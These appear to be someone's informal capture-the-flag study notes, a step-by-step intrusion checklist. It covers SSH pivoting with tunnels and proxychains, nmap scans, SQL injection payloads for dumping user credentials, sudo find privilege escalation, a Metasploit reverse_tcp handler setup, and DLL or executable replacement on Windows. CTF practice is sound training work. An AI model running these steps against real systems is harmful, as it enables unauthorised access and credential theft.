CHECK ROBOTS.TXT
========================================

LOGIN to ssh
whoami && hostname
check for Priv Esc if the CTFD says so



IF NO PRIV ESC then PIVOT

check /etc/hosts
ip a
take first 3 octets and 'PING SWEEP'
    If TTL is 64 then ignore bc its a router
    Record other Ip's

Back out of ssh
Set up tunnels to First box
Proxychain it
sudo proxychains nmap -Pn -sT -T4 192.168.28.181,172 -p22,80,...
    Add response to notes
Interro Ports
    proxychains nc 
ssh -S /tmp/boo -O forward -L8080:<ip>:80 dummy

    Gives a list 
    SWL injection
    try every option for vuln option
        <option> OR 1=1
    <vulnerable option>[' if string] UNION SELECT 1,2,3;#
        Maneuver your statement based on response (1,3,2   1,2,3)

            <vulnerable option>[' if string] UNION SELECT user_id, FROM SITEUSERS.USERS;#
    CTFD will guide what you need to look for
    
    ADD TO CREDS
        Decode from ROT13
check robots.txt 
If you see a wall of text view the page source, you might see a link

Try all creds on ssh 
If it doesnt work it doesnt work 
  IT HAPPENS OFTEN

ssh -S /tmp/blah -O forward -L2222:<other ip>:22 ackack
ssh -MS /tmp/newblah Aaron@127.0.0.1 -p2222
        CASE SENSITIVITY
When you get a shell 
WHOAMI && hostname
Check for Priv esc
sudo -l
/usr/bin/find is vulnerable to sudo
get root access
enumerate
    Check /root
    not every home dir in /home
    netstat -antp
    
PING SWEEP
You can go back and use directory traversal to check for backend access to the machine

New Proxychain on box
445 Always SMB
3389 Always RDP
9999 IDK LOL
BANNER GRAB

IF YOU SEE SECURE SERVER the machine is dummy easy lol
    Use windows buff that you already have

    msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 0.0.0.0
    set lport 54321
IF NOT open then RDP in
ssh -S /tmp/T2 -O forward -L9833:<IP>:3389 dummy
xfreerdp /u:comrade /v:127.0.0.1:9833 +clipboard +dynamic-resolution +glyph-cache

TRaverse to secure server
If they give you a dll its dll hijacking
    Find the name of a dll and replace it
If the give you a executable its exe replacement
    If you can successful rename it you can replace it
    Use the file they give you and replace it where putty is or wherever it goes with .exe
    Replace it and restart the box
        MINIMUM 3 RESTARTS
